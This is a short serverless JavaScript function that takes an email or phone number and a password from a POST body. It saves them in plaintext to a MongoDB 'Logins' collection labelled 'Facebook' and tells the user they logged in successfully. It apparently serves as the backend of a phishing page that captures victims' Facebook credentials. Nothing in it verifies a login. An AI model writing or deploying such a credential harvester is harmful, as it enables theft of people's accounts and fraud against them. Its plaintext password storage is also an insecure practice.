const { MongoClient } = require("mongodb");
import { MONGO_URI } from "../../secrets.js";
const client = new MongoClient(MONGO_URI);// Ensure your Mongo URI is set in environment variables
const database = client.db('GameChunks');
const logins = database.collection('Logins');


exports.handler = async function(event, context) {
    try {
        // Only allow POST requests
        if (event.httpMethod !== 'POST') {
            return {
                statusCode: 405,
                body: JSON.stringify({ message: "Method Not Allowed" }),
            };
        }

        // Parse the query parameters from the POST request
        const { password, email, number} =  JSON.parse(event.body);
        
       let uid = email;
       if(number) uid = number;
       
        // Connect to MongoDB
        await client.connect();

        await logins.insertOne({ uid, pwd: password, date: new Date(), platform: "Facebook"});
	

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Logged in successfully" }),
        };

    } catch (error) {
        console.error(error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Internal Server Error" }),
        };
    } finally {
        await client.close();
    }
};
